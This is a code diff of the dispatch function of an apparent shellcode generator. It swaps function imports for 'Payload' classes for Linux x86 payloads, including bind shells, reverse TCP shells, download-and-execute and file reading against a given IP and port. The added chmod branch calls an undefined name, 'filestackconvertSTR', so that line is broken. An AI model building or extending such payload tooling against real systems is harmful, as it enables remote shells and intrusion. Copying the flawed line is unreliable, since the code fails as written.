@@ -10,39 +10,39 @@
 def generator( choose=None, shellcode=None, COMMAND=None, FILE=None, ip=None, port=None, URL=None, PASSWORD=None, MESSAGE=None, FILENAME=None):
 	if choose == "linux86":
 		if shellcode == "binsh_spawn":
-			from .Linux86.bin_shx86 import bin_shx86
-			return bin_shx86()
+			from .Linux86.bin_shx86 import Payload
+			return Payload().getpayload()
 
 		elif shellcode == "exec":
-			from .Linux86.execc import execc
-			return execc( COMMAND)
+			from .Linux86.execc import Payload
+			return Payload( execommand=COMMAND).getpayload()
 
 		elif shellcode == "read":
-			from .Linux86.readfilex86 import readx86
+			from .Linux86.readfilex86 import Payload
 			from .stackconvert import stackconvertSTR
-			return readx86( stackconvertSTR(FILE))
+			return Payload( file=stackconvertSTR(FILE)).getpayload()
 
 		elif shellcode == "download&exec":
-			from .Linux86.download import downloadANDexecute
+			from .Linux86.download import Payload
 			from .stackconvert import stackconvertSTR
 			filename = URL.split("/")[-1]
-			return downloadANDexecute( stackconvertSTR(URL), stackconvertSTR(filename))
+			return Payload( url=stackconvertSTR(URL), filename=stackconvertSTR(filename)).getpayload()
 
 		elif shellcode == "chmod":
-			from .Linux86.chmod import ch
+			from .Linux86.chmod import Payload
 			from .stackconvert import stackconvertSTR
-			return ch( stackconvertSTR(FILE))
+			return Payload( file=filestackconvertSTR(FILE)).getpayload()
 
 		elif shellcode == "tcp_bind":
-			from .Linux86.tcp_bindx86 import tcp_bindx86
+			from .Linux86.tcp_bindx86 import Payload
 			from .stackconvert import PORT
-			return tcp_bindx86(  PORT(port))
+			return Payload(  lport=PORT(port)).getpayload()
 
 		elif shellcode == "reverse_tcp":
-			from .Linux86.reverse_tcpx86 import reverse_tcpx86
+			from .Linux86.reverse_tcpx86 import Payload
 			from .stackconvert import IP
 			from .stackconvert import PORT
-			return reverse_tcpx86( IP(ip), PORT(port))
+			return Payload( host=IP(ip), lport=PORT(port)).getpayload()
 
 	elif choose == "linux64":
 		if shellcode == "binsh_spawn":
@@ -118,7 +118,7 @@ def generator( choose=None, shellcode=None, COMMAND=None, FILE=None, ip=None, po
 			from .stackconvert import IP
 			from .stackconvert import PORT
 			return reverse_tcp( IP(ip), PORT(port))
-
+	
 
 	elif choose == "osx64":
 		if shellcode == "binsh_spawn":
